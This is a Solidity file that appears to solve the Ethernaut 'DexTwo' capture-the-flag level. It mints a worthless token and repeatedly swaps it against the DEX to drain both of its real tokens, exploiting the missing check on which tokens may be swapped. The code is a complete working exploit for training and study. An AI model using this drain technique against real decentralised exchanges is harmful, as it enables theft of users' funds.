// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {DexTwo, SwappableTokenTwo} from "../levels/DexTwo.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {console} from "forge-std/console.sol";

contract OtherToken is ERC20 {
    constructor(address dexAddress, uint256 tokenAmount, uint256 tokenSupply) ERC20("Other Token", "OTK") {
	_mint(msg.sender, ((2 ** tokenAmount) * tokenSupply) - tokenSupply);
	_mint(dexAddress, tokenSupply);
	console.log(tokenSupply);
	console.log(((2 ** tokenAmount) * tokenSupply) - tokenSupply);
    }
}

contract DexTwoAttack {
    function attack(address levelAddress) public {
	DexTwo instance = DexTwo(payable(levelAddress));

	SwappableTokenTwo token1 = SwappableTokenTwo(payable(instance.token1()));
	SwappableTokenTwo token2 = SwappableTokenTwo(payable(instance.token2()));
        OtherToken token3 = new OtherToken(levelAddress, uint256(2), token1.balanceOf(levelAddress));

	token3.approve(levelAddress, token3.balanceOf(address(this)));
	
	address token1Address = address(token1);
	address token2Address = address(token2);
	address token3Address = address(token3);

        uint256 token1Balance = token1.balanceOf(levelAddress);
	uint256 token2Balance = token2.balanceOf(levelAddress);
	uint256 token3Balance = token3.balanceOf(levelAddress);
	uint256 totalBalance = token1Balance + token2Balance;

	while (totalBalance > 0) {
	    if (token1Balance > 0) {
		instance.approve(levelAddress, token3Balance);
		instance.swap(token3Address, token1Address, token3Balance);
		token1Balance = token1.balanceOf(levelAddress);
		token2Balance = token2.balanceOf(levelAddress);
		token3Balance = token3.balanceOf(levelAddress);
		totalBalance = token1Balance + token2Balance;
		console.log(totalBalance);
	    }
	    if (token2Balance > 0) {
		instance.approve(levelAddress, token3Balance);
		instance.swap(token3Address, token2Address, token3Balance);
		token1Balance = token1.balanceOf(levelAddress);
		token2Balance = token2.balanceOf(levelAddress);
		token3Balance = token3.balanceOf(levelAddress);
		totalBalance = token1Balance + token2Balance;
		console.log(totalBalance);
	    }
	}
    }
}
